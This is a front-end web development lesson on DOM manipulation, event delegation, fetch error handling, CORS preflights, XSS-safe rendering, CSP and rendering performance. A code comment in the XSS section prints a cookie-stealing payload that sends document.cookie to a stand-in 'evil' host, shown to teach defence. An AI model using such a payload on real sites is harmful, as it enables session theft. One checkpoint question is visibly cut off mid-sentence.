The DOM is your HTML document as a live tree of objects. Everything you do with JavaScript in a
browser is one of three things: find nodes, change nodes, or react to events on nodes. Doing each
of those *in bulk* is where every performance problem comes from, and the fix is always the same
shape — touch the tree as few times as possible.

    ### Plain English

    The **DOM** (Document Object Model) is the browser's in-memory representation of your page: an
    object for every element, nested exactly as your HTML was. It is *live* — change an object and
    the screen updates.

    Three things you do to it:

    - **Select.** `document.querySelector('.card')` returns the first matching element;
      `querySelectorAll` returns all of them as a static list.
    - **Change.** `el.textContent = 'hi'` sets the text. `el.classList.add('active')` toggles a
      class. `document.createElement('li')` makes a new node, `parent.appendChild(node)` inserts it.
    - **React.** `el.addEventListener('click', fn)` runs `fn` when the element is clicked.

    An **event** is an object describing something that happened — a click, a keypress, a form
    submission. When you click a button inside a list inside the page, the event does not fire only
    on the button. It travels **down** the tree from `document` to the button (the *capture*
    phase), then **up** from the button back to `document` (the *bubble* phase). Every ancestor
    gets a chance to handle it on the way. That is what makes **event delegation** possible: put
    one listener on the list, and it hears clicks from every row — including rows that did not
    exist when you attached it.

    **`fetch`** is the browser's function for making HTTP requests. It returns a promise. Two
    things surprise everyone: `fetch` only rejects on a *network* failure, so a 404 or a 500 is a
    successful promise with `res.ok === false`; and reading the body is a second async step
    (`await res.json()`), because the headers arrive before the body does.

    ### The analogy

    Event delegation is a receptionist. You could station a person at every office door to greet
    visitors — that is one listener per row, and when you add a room you must remember to hire.
    Or you put one receptionist at the building entrance who asks every visitor which office they
    came from. New offices need no new staff. The visitor telling you where they came from is
    `event.target`.

    ### Smallest working example

    ```html
    <!doctype html>
    <html lang="en"><meta charset="utf-8"><title>Users</title>
    <style>
      body { font: 16px/1.5 system-ui, sans-serif; max-width: 40rem; margin: 2rem auto; }
      li { padding: .5rem; border-bottom: 1px solid #e5e5e5; }
      [hidden] { display: none; }
      .error { color: #e03131; }
    </style>

    <h1>Users</h1>
    <button id="load">Load users</button>

    <p id="loading" hidden>Loading…</p>
    <p id="empty"   hidden>No users found.</p>
    <p id="error"   hidden class="error" role="alert"></p>
    <ul id="list"></ul>

    <script type="module">
    const $ = (id) => document.getElementById(id);
    const states = { loading: $('loading'), empty: $('empty'), error: $('error'), list: $('list') };

    function show(state, message = '') {
      for (const el of Object.values(states)) el.hidden = true;
      states[state].hidden = false;
      if (state === 'error') states.error.textContent = message;
    }

    $('load').addEventListener('click', async () => {
      show('loading');
      try {
        const res = await fetch('https://jsonplaceholder.typicode.com/users');
        if (!res.ok) throw new Error(`Server said ${res.status}`);   // fetch does NOT throw here
        const users = await res.json();

        if (users.length === 0) return show('empty');

        const frag = document.createDocumentFragment();
        for (const u of users) {
          const li = document.createElement('li');
          li.textContent = `${u.name} — ${u.email}`;                 // safe: never parsed as HTML
          li.dataset.userId = u.id;
          frag.appendChild(li);
        }
        states.list.replaceChildren(frag);                           // one DOM write
        show('list');
      } catch (err) {
        show('error', `Could not load users: ${err.message}`);
      }
    });

    // ONE listener for every row, including rows added later
    states.list.addEventListener('click', (e) => {
      const li = e.target.closest('li');
      if (!li) return;
      console.log('clicked user', li.dataset.userId);
    });
    </script>
    </html>
    ```

    ### Line by line

    - `[hidden] { display: none; }` — browsers style `hidden` by default, but any `display` rule on
      the element beats it, so declaring it explicitly avoids a very common "why is my hidden
      element visible" hour.
    - `show(state)` — a single function that owns which state is visible. Without it you get
      scattered `hidden = true` lines and eventually two states showing at once.
    - `if (!res.ok) throw` — required. `fetch` resolves for 404 and 500; only a DNS failure,
      connection refusal or abort rejects.
    - `await res.json()` — parses the body. It is separate from the response because headers arrive
      first, which is what lets you decide whether to read the body at all.
    - `document.createDocumentFragment()` — an off-screen container. Appending to it costs nothing
      on screen; appending *it* to the DOM is one operation.
    - `li.textContent = ...` — sets text. If the value contains `<img onerror=...>` it appears as
      literal characters. Using `innerHTML` here would execute it. That is *XSS*
      (cross-site scripting) — running an attacker's JavaScript in your user's session.
    - `li.dataset.userId = u.id` — writes a `data-user-id` attribute. `dataset` is how you attach
      your own data to a node without inventing attributes.
    - `replaceChildren(frag)` — clears and inserts in one call. Better than `innerHTML = ''`
      followed by appends, which does two passes.
    - `e.target.closest('li')` — `target` is the deepest element clicked (maybe a `<span>` inside
      the row); `closest` walks up to the row. Without it, clicking a child breaks your handler.

    ### Guided practice

    Add three things to the example. 60% is written above.

    1. A **search box** that filters the list. Use `input` (fires on every keystroke), not
       `change` (fires on blur).
    2. A **debounce** so filtering waits 250 ms after typing stops:

       ```js
       const debounce = (fn, ms) => {
         let t;
         return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };
       };
       ```

    3. An **empty state** for when the filter matches nothing — a different message from
       "no users found", because the fix is different: one means clear the filter, the other means
       there is no data.

    <Accordion title="Checkpoint — 5 questions before you continue">
      **1. Why does `fetch` not throw on a 500?**
      Because the HTTP exchange succeeded — the server answered. The promise reflects the
      *network*, not the status. Check `res.ok` yourself.

      **2. Why one listener on the `<ul>` rather than one per `<li>`?**
      Events bubble, so the container hears them all. It works for rows added later and uses one
      listener instead of N — at 50,000 rows that is 50,000 objects you did not allocate.

      **3. Why `textContent` and not `innerHTML`?**
      `textContent` never parses markup. `innerHTML` with data you did not author is an XSS
      vulnerability.

      **4. What are the four UI states?**
      Loading, empty, error, success. Shipping only the fourth is the most common front-end defect
      in existence.

      **5. What does `e.target.closest('li')` protect you from?**
      `target` being a child of the row. Without `closest`, clicking text inside a `<span>` inside
      the row misses your handler entirely.

    ### The real theory: CORS, explained from the browser's side

    The **same-origin policy** says a page may not *read* a response from a different origin
    (scheme + host + port) unless that server opts in. **CORS** (Cross-Origin Resource Sharing) is
    the opt-in protocol. Three facts settle almost every CORS argument:

    1. **CORS is enforced by the browser, not the server.** `curl` and Postman ignore it entirely.
       "It works in Postman" tells you nothing about a CORS bug.
    2. **The fix is always on the server.** No client-side header, fetch option or proxy setting
       makes a browser accept a response the server did not authorise. (A dev proxy "fixes" it by
       making the request same-origin — which is a different request, not a fix.)
    3. **The request is often sent anyway.** For a *simple* request the browser sends it, receives
       the response, and *then* refuses to let your JavaScript read it. Your server may already
       have charged the card.

    A request is **simple** — no preflight — if the method is `GET`, `HEAD` or `POST`, and the only
    author-set headers are on a small safelist, and `Content-Type` is one of
    `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`. Note what is
    missing: `application/json` is **not** simple, and neither is `Authorization`. So a normal API
    call triggers a **preflight**: an `OPTIONS` request asking permission first.

    ```http
    OPTIONS /api/orders HTTP/1.1
    Origin: https://app.example.com
    Access-Control-Request-Method: POST
    Access-Control-Request-Headers: authorization, content-type
    ```

    ```http
    HTTP/1.1 204 No Content
    Access-Control-Allow-Origin: https://app.example.com
    Access-Control-Allow-Methods: GET, POST, PATCH, DELETE
    Access-Control-Allow-Headers: authorization, content-type
    Access-Control-Allow-Credentials: true
    Access-Control-Max-Age: 600
    Vary: Origin
    ```

    Four details that bite in production. `Access-Control-Max-Age: 600` caches the preflight for 10
    minutes — without it you pay an extra round trip on **every** request, which on a 150 ms mobile
    link doubles your latency. With `Allow-Credentials: true` you may **not** use
    `Allow-Origin: *`; you must echo the specific origin, and therefore you must send
    `Vary: Origin` or a shared cache will serve one tenant's allowed origin to another. If your
    JavaScript needs to read a custom response header, it must be listed in
    `Access-Control-Expose-Headers` — this is why `X-Request-Id` is invisible to your error
    reporter. And a redirect during a preflight is a hard failure in every browser.

    ### The production surface: the four states, as a discipline

    ```js
    /**
     * fetchJSON — the wrapper every project ends up needing.
     * Distinguishes: network failure, HTTP error (with parsed body), abort, and success.
     */
    export async function fetchJSON(url, { signal, timeout = 8000, ...init } = {}) {
      const ac = new AbortController();
      const onAbort = () => ac.abort(signal?.reason);
      signal?.addEventListener('abort', onAbort, { once: true });
      const timer = setTimeout(() => ac.abort(new DOMException('Timeout', 'TimeoutError')), timeout);

      try {
        const res = await fetch(url, {
          ...init,
          signal: ac.signal,
          headers: { Accept: 'application/json', ...init.headers },
        });

        const isJSON = (res.headers.get('content-type') ?? '').includes('application/json');
        const body = isJSON ? await res.json().catch(() => null) : await res.text();

        if (!res.ok) {
          const err = new Error(body?.detail ?? body?.message ?? `HTTP ${res.status}`);
          err.status = res.status;
          err.body = body;
          err.requestId = res.headers.get('x-request-id');   // needs Expose-Headers server-side
          throw err;
        }
        return body;
      } finally {
        clearTimeout(timer);
        signal?.removeEventListener('abort', onAbort);
      }
    }
    ```

    This is deliberately boring, and every line is load-bearing. The timeout is a *separate*
    controller chained to the caller's signal, so a component unmount and a timeout both work and
    neither leaks a timer. The `content-type` check means an HTML error page from a proxy does not
    crash the JSON parser. The status and parsed body are attached to the error, so the UI can show
    a validation message from the server instead of "something went wrong". And the `finally`
    removes the listener — without it, a long-lived caller signal accumulates listeners on every
    request.

    ### Trade-offs

    | Decision | Choose the first when… | Choose the second when… |
    | --- | --- | --- |
    | **Event delegation vs per-element listeners** | The list is dynamic, large, or re-rendered — which is nearly always. | The element is unique and long-lived and the handler needs no target discrimination. |
    | **Debounce vs throttle** | You want the *final* value after activity stops: search, autosave, resize-then-recompute. | You want a *steady rate* during continuous activity: scroll position, drag, progress. |
    | **Optimistic UI vs waiting for the server** | The operation almost always succeeds and the rollback is cheap and visible: likes, toggles, reordering. | The operation can fail in ways the user must see immediately, or the rollback would be confusing: payments, deletes, anything with money. |
    | **`innerHTML` with a template vs `createElement`** | Content is fully static and author-controlled, and you have measured that it matters. | Any of it comes from data. Then `textContent` for text and `setAttribute` for attributes, or a sanitizer you did not write yourself. |
    | **Render everything vs virtualize** | Under ~1,000 rows; the complexity is not worth it. | Beyond a few thousand rows — measured 252.8 ms versus 0.3 ms at 50,000. |

    ### Reference implementation: XSS-safe rendering

    ```js
    // UNSAFE — one user with a display name of  <img src=x onerror="fetch('https://evil/'+document.cookie)">
    // and every viewer's session is exfiltrated.
    row.innerHTML = `<span class="name">${user.name}</span>`;

    // SAFE — structure from code, data as text
    const span = document.createElement('span');
    span.className = 'name';
    span.textContent = user.name;
    row.replaceChildren(span);

    // SAFE and terse for repeated shapes
    const tpl = document.getElementById('row-tpl');           // a <template> in the HTML
    const node = tpl.content.cloneNode(true);
    node.querySelector('.name').textContent = user.name;
    node.querySelector('.email').textContent = user.email;
    list.appendChild(node);
    ```

    The rule that survives every framework: **structure comes from code you wrote, values come from
    data, and the two are never concatenated into a string.** If you must render user-supplied
    HTML — a rich-text field — use a maintained sanitizer such as DOMPurify and a strict
    Content-Security-Policy, and treat it as a feature with a threat model rather than a
    convenience.

    ### What breaks in the real world

    An admin table rendered 3,000 orders and became unusable: 4–6 second freezes on every filter
    change, with users reporting "the browser asks if I want to kill the page". The code looked
    innocent — a loop that appended a row and then read `row.offsetHeight` to decide whether to add
    a `is-tall` class.

    That read is the bug. Reading a layout property after a DOM write forces the browser to
    recompute layout *synchronously*, right then, before returning the value. In a loop that is one
    full layout per row. Measured on this machine with the same shape of code:

    | Pattern | Rows | Time |
    | --- | --- | --- |
    | Append all, then read `offsetHeight` once | 50,000 | 230.7 ms |
    | Append and read `offsetHeight` inside the loop | 5,000 | **2,406.3 ms** |

    Ten times fewer rows, ten times more time — a **~100× per-row penalty**. The fix was to append
    everything, then read all heights in one pass, then write all classes in one pass. Filter
    changes went from 4.2 s to 71 ms. Nobody changed a framework, a server, or a query.

    <Accordion title="Design checkpoint — model answer inside">
      **Question.** Your `POST /api/orders` works with `curl` but the browser reports "blocked by
      CORS policy: response to preflight request doesn't pass access control check". The team

      `Content-Type: application/json` and an `Authorization` header both disqualify it from being
      a simple request) and the server's answer did not authorise it. Fix the server: answer
      `OPTIONS` with `Access-Control-Allow-Origin` echoing the exact origin, `Allow-Methods`
      including `POST`, `Allow-Headers` including `authorization, content-type`, plus
      `Max-Age: 600` to stop paying the extra round trip, and `Vary: Origin` so caches do not mix
      tenants. In Week 6 you will do exactly this with FastAPI's `CORSMiddleware`, and you will see
      that the common mistake there is mounting it after another middleware that short-circuits the
      `OPTIONS` request.

    **For anyone who has shipped this and been burned.** Internals, scale, numbers.

    ### Under the hood: why DOM writes are cheap and DOM reads are not

    Modern engines batch DOM mutations. Appending a node marks ancestors dirty and returns; layout
    is deferred to the next frame. That is why appending 50,000 nodes measured **15.2 ms**. The
    expensive part is the *layout* those writes eventually force — 230.7 ms including it — and,
    catastrophically, any read that forces layout *early*.

    Layout-forcing reads include `offsetWidth`/`offsetHeight`, `offsetTop`, `scrollTop`,
    `clientWidth`, `getBoundingClientRect()`, `getComputedStyle()` and `focus()`. Each one, after a
    pending write, triggers a synchronous recalculation of the whole affected subtree.

    ### At scale: 50,000 rows, six ways, measured

    Chrome 134 headless, Apple Silicon. Identical data and markup; the only difference is how the
    nodes reach the document.

    | Strategy | Build | Build + forced layout | Nodes |
    | --- | --- | --- | --- |
    | `innerHTML +=` per row | 123.6 ms **for 1,000 rows** | — | 1,000 |
    | ↳ extrapolated to 50,000 (it is O(n²)) | **~309 s** | — | — |
    | `appendChild` per row | 15.2 ms | 230.7 ms | 50,000 |
    | `DocumentFragment`, one append | 36.9 ms | 264.2 ms | 50,000 |
    | Build one string, one `innerHTML` assignment | 17.7 ms | 252.8 ms | 50,000 |
    | **Virtualized: render 30 visible rows** | **0.1 ms** | **0.3 ms** | 30 |

    Three conclusions, in order of how much money they save.

    **`innerHTML +=` is quadratic and must never appear in a loop.** Each `+=` serialises the
    entire current DOM subtree to a string, concatenates, and re-parses all of it. At 1,000 rows it
    is 123.6 ms; the work grows with n², so 50,000 rows is roughly 2,500× that — about five
    minutes. This is not a slow path, it is a hang.

    **Among the correct strategies, the difference is noise.** 230.7 ms, 252.8 ms and 264.2 ms are
    the same number for engineering purposes, because they are all dominated by laying out 50,000
    boxes, not by how the nodes were created. `DocumentFragment` is not magic — it matters when you
    would otherwise cause *layout* between insertions, which the plain `appendChild` loop does not
    because layout is deferred anyway.

    **Virtualization is the only thing that changes the order of magnitude.** Rendering the 30 rows
    that fit on screen costs 0.3 ms against 252.8 ms — **843× faster** — because the browser lays
    out 30 boxes instead of 50,000. Against a 16.7 ms frame budget, the full render burns 15 frames
    and the virtualized one burns 2% of one. Everything else on this list is rearranging deck
    chairs.

    A modern middle path worth knowing: `content-visibility: auto` with `contain-intrinsic-size`
    tells the browser to skip layout and paint for off-screen subtrees while keeping every node in
    the DOM. It gets much of virtualization's benefit with none of the scroll-position bookkeeping,
    at the cost of a scrollbar that jumps if your `contain-intrinsic-size` estimate is wrong.

    ### Why frameworks exist, and what they cost

    Everything above is achievable by hand. What is not achievable by hand, at scale, is keeping
    the DOM synchronised with state as both change over months and across a team. That is the
    problem React, Vue and Svelte solve: you describe what the UI should be for a given state and
    the library computes the mutations. The cost is real and worth stating in numbers: a React 18
    plus React-DOM bundle is roughly 45 KB gzipped before you write a line, and every state update
    runs a reconciliation pass whose cost scales with tree size, not with what changed.

    The honest rule: below roughly ten interactive components with mostly local state, hand-written
    DOM is smaller, faster and easier to debug. Above that, the framework's constraint on *how* you
    mutate is worth more than the bytes it costs. Deciding by measurement rather than by default is
    the senior behaviour.

    ### Content-Security-Policy: the second lock on XSS

    Escaping is your first defence; CSP is what saves you when one escape is missed.

    ```http
    Content-Security-Policy: default-src 'self';
      script-src 'self' 'nonce-r4nd0m';
      object-src 'none'; base-uri 'none'; frame-ancestors 'none'
    ```

    `script-src 'self' 'nonce-...'` means inline scripts run only if they carry the matching
    per-response nonce — so injected `<script>` and `onerror=` attributes do not execute even when
    they reach the page. `object-src 'none'` and `base-uri 'none'` close two well-known bypasses:
    plugin content, and rewriting the document base so relative script URLs resolve to an
    attacker's host. Deploy it first with `Content-Security-Policy-Report-Only` and a `report-to`
    endpoint, and read the reports for a week before enforcing — that ordering is the difference
    between a successful CSP rollout and a rollback.

    ### Production failure modes

    | Failure | Signature | Detection |
    | --- | --- | --- |
    | Tab freezes when a list grows | UI unresponsive for seconds, one very long task in the profiler | Performance panel: a single Recalculate Style / Layout block. Look for a read inside a write loop |
    | Click handlers stop working after re-render | Works before pagination, dead after | Listeners bound to nodes that were replaced. Delegate to a stable container |
    | Memory grows on every navigation | Heap snapshot shows detached nodes with retained size | Listeners not removed. Use `addEventListener(…, { signal })` and abort on teardown |
    | XSS through a "safe" field | Report of script execution from a profile name or a filename | Any `innerHTML` fed by data. Grep for it; ban it with an ESLint rule |
    | Stale results after fast typing | Results flicker between queries | No cancellation. `AbortController` per request (see `P1-W05-M4`) |
    | CORS error only in production | Works locally, fails on the deployed origin | The allowed-origins list is environment-specific; and `Vary: Origin` is missing so a CDN cached one origin's answer |

    ### Frontier and primary sources

    - **WHATWG DOM Standard.** *Takeaway:* events have a fully specified three-phase propagation
      path, which is why delegation is a guarantee rather than a trick.
    - **Fetch Standard (WHATWG).** *Takeaway:* CORS is specified as a set of checks the *browser*
      performs on the response, which is why no client-side option can bypass it.
    - **CSP Level 3 (W3C).** *Takeaway:* nonce- and hash-based policies make inline injection
      inert, which is the only XSS defence that survives a missed escape.
    - **Chrome DevTools, "Analyze runtime performance."** *Takeaway:* forced synchronous layout is
      called out explicitly in the trace with a warning triangle — you never have to guess whether
      you have this bug.

## Common mistakes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `fetch` does not throw on a 500 | It only rejects on network failure | Check `res.ok` and throw yourself |
| Handler works for the first ten rows only | Listeners bound before the rest were added | Delegate to a stable container and use `closest()` |
| Clicking the icon inside a row does nothing | `e.target` is the icon, not the row | `e.target.closest('[data-row]')` |
| Tab hangs while building a list | `innerHTML +=` in a loop (O(n²)) | Build once and assign once, or virtualize |
| A filter takes seconds on 3,000 rows | Layout read inside a write loop | Batch reads, then batch writes: 2,406 ms → ~230 ms |
| Script from a username executes | `innerHTML` with user data | `textContent`; add CSP with nonces |
| "Works in Postman, not in the browser" | CORS — Postman does not enforce it | Fix the server's CORS response; never `mode: 'no-cors'` |
| Every request pays an extra round trip | No `Access-Control-Max-Age` on the preflight response | Add it (600 s is a sane default) |
| Custom response header is `null` in JS | Not listed in `Access-Control-Expose-Headers` | Add the header name server-side |

## Assessment

**Concept questions**

1. Why does `fetch` resolve on a 404? *(The network exchange succeeded; status is data, not failure.)*
2. What are the three phases of event propagation? *(Capture down, at target, bubble up.)*
3. Why is event delegation more than a performance trick? *(It works for nodes that do not exist yet, so re-rendering cannot silently break handlers.)*
4. Give the four UI states and why shipping only "success" is a bug. *(Loading, empty, error, success — users spend most of their bad moments in the first three.)*
5. Which requests trigger a CORS preflight? *(Anything not simple: non-safelisted methods, `Content-Type: application/json`, custom headers like `Authorization`.)*
6. Why can no client-side change fix a CORS error? *(The browser enforces it against the *server's* response headers; only the server can authorise.)*
7. Why is `innerHTML +=` in a loop quadratic? *(Each assignment serialises and re-parses the entire subtree.)*
8. What makes a DOM read expensive? *(It forces a synchronous layout when writes are pending — measured ~100× per row when interleaved.)*

**Coding challenge.** Build a list view over a 50,000-item dataset with search (debounced, cancellable), all four states, keyboard navigation and virtualization. Hidden tests: no `innerHTML` with data; exactly one delegated click listener; initial render under 50 ms; DOM node count under 200 at any scroll position; aborting a search leaves no pending request.

## Sources & further reading

**Primary docs**

- [MDN: Introduction to events](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Building_blocks/Events) — read the bubbling and delegation sections; they are the clearest short explanation available.
- [MDN: Using the Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) — read this for the response body methods and why they are separate promises.
- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) — read the "Simple requests" and "Preflighted requests" sections; the safelist is the part everyone guesses at and gets wrong.

**Specs and their takeaways**

- **[WHATWG DOM Standard.](https://dom.spec.whatwg.org/)** *Takeaway:* the three-phase event path is normative, so delegation is guaranteed behaviour rather than an implementation detail.
- **[Fetch Standard, CORS protocol.](https://fetch.spec.whatwg.org/)** *Takeaway:* the checks live in the browser, on the response — which is precisely why no fetch option can bypass them.
- **[CSP Level 3.](https://www.w3.org/TR/CSP3/)** *Takeaway:* nonce-based policies neutralise injected scripts, giving you a second line of defence when one escape is missed.

**Go deeper**

- [Google's *Web Fundamentals: rendering performance*, plus the Chrome DevTools "forced synchronous layout" documentation](https://web.dev/articles/rendering-performance) — read them together and then profile your own worst page.
